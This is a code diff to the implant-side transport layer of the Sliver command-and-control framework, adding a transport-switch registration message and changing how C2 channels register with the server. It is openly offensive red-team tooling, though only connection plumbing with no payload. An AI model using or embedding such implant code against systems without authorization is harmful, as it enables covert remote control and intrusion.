@@ -35,6 +35,7 @@ import (
 
 	"google.golang.org/protobuf/proto"
 
+	"github.com/bishopfox/sliver/protobuf/commonpb"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
 
 	// {{if .Config.CommEnabled}}
@@ -133,7 +134,10 @@ func NewC2FromBytes(profileData string) (t *C2, err error) {
 // NewC2FromProfile - Generate a kinda ready C2 channel driver, from a profile.
 func NewC2FromProfile(p *sliverpb.C2Profile) (t *C2, err error) {
 
-	t = &C2{Profile: p}
+	t = &C2{
+		ID:      p.ID,
+		Profile: p,
+	}
 
 	path := p.Hostname
 	if p.Port > 0 {
@@ -179,9 +183,6 @@ func (t *C2) Start() (err error) {
 		t.startBeacon()
 	}
 
-	// 3 - Any registration is sent
-	err = t.Register()
-
 	return nil
 }
 
@@ -223,6 +224,25 @@ func (t *C2) Register() (err error) {
 	return
 }
 
+// RegisterTransportSwitch - Notify the server that this transport is started after a switch
+func (t *C2) RegisterTransportSwitch(oldTransportID string) (err error) {
+
+	// Register a session
+	if t.Profile.Type == sliverpb.C2Type_Session {
+		t.Connection.RequestSend(t.registerSwitch(oldTransportID))
+	}
+
+	// Or register a beacon
+	if t.Profile.Type == sliverpb.C2Type_Beacon {
+		t.Beacon.Start()
+	}
+
+	// This C2 is now active
+	t.Profile.Active = true
+
+	return
+}
+
 // Stop - Gracefully shutdowns all components of this transport. The force parameter is used in case
 // we have a mux transport, and that we want to kill it even if there are pending streams in it.
 func (t *C2) Stop() (err error) {
@@ -233,7 +253,6 @@ func (t *C2) Stop() (err error) {
 
 	// Close the RPC connection per se.
 	if t.Connection != nil {
-		// t.Connection.Stop()
 		t.Connection.Cleanup()
 	}
 
@@ -321,6 +340,39 @@ func (t *C2) registerSliver() *sliverpb.Envelope {
 	}
 	return &sliverpb.Envelope{
 		Type: sliverpb.MsgRegister,
+		Data: data,
+	}
+}
+
+// registerSwitch - The transport is started following a request to switch
+// transports. The registering process is not as complete as the classic
+// one, and we just update connection/transport relevant values.
+func (t *C2) registerSwitch(oldTransportID string) *sliverpb.Envelope {
+
+	p := t.Profile
+	path := p.Hostname
+	if p.Port > 0 {
+		path = path + ":" + strconv.Itoa(int(p.Port))
+	}
+	if p.Path != "" {
+		path = path + p.Path
+	}
+
+	data, err := proto.Marshal(&sliverpb.RegisterTransportSwitch{
+		OldTransportID: oldTransportID,
+		TransportID:    t.ID,
+		RemoteAddress:  path,
+		Response:       &commonpb.Response{},
+	})
+
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("Failed to encode register msg %s", err)
+		// {{end}}
+		return nil
+	}
+	return &sliverpb.Envelope{
+		Type: sliverpb.MsgRegisterTransportSwitch,
 		Data: data,
 	}
 }
